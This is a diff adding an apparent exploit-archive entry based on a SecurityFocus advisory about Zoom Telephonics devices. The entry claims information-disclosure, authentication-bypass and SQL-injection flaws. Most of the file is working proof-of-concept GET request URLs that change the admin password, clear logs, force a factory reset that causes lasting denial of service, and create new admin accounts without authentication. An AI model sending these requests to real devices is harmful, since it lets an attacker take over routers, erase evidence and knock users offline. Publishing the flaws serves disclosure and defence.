@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/61044/info
+
+Multiple Zoom Telephonics devices are prone to an information-disclosure vulnerability, multiple authentication bypass vulnerabilities and an SQL-injection vulnerability.
+
+Exploiting these issues could allow an attacker to gain unauthorized access and perform arbitrary actions, obtain sensitive information, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Vulnerability proofs and examples-
+All administrative items can be accessed through these two URLs
+
+--Menu Banner
+http://www.example.com/hag/pages/toc.htm
+
+-Advanced Options Menu
+http://www.example.com/hag/pages/toolbox.htm
+
+Example commands that can be executed remotely through a web browser
+URL, or a modified HTTP GET/POST requests-
+
+-Change Password for admin Account
+
+On Firmware 2.5 or lower
+http://www.example.com/hag/emweb/PopOutUserModify.htm/FormOne&user=admin&ex_param1=
+admin&new_pass1=123456&new_pass2=123456&id=3&cmdSubmit=Save+Changes
+
+On Firmware 3.0-
+http://www.example.com/hag/emweb/PopOutUserModify.htm?id=40&user=admin&Zadv=1&ex_pa
+ram1=admin&new_pass1=123456&new_pass2=123456&id=3&cmdSubmit=Save+Changes
+
+-Clear Logs
+http://www.example.com/Action?id=76&cmdClear+Log=Clear+Log
+
+-Remote Reboot to Default Factory Settings-
+Warning - For all intents and purposes, this action will almost always
+result in a long term Denial of Service attack.
+http://www.example.com/Action?reboot_loc=1&id=5&cmdReboot=Reboot
+
+-Create New Admin or Intermediate Account-
+On Firmware 2.5 or lower
+http://www.example.com/hag/emweb/PopOutUserAdd.htm?id=70&user_id="newintermediateac
+count"&priv=v2&pass1="123456"&pass2="123456"&cmdSubmit=Save+Changes
+
+On Firmware 3.0-
+http://www.example.com/hag/emweb/PopOutUserAdd.htm?id=70&Zadv=1&ex_param1=adminuser
+_id="newadminaccount"&priv=v1&pass1="123456"&pass2="123456"&cmdSubmit=Sa
+ve+Changes
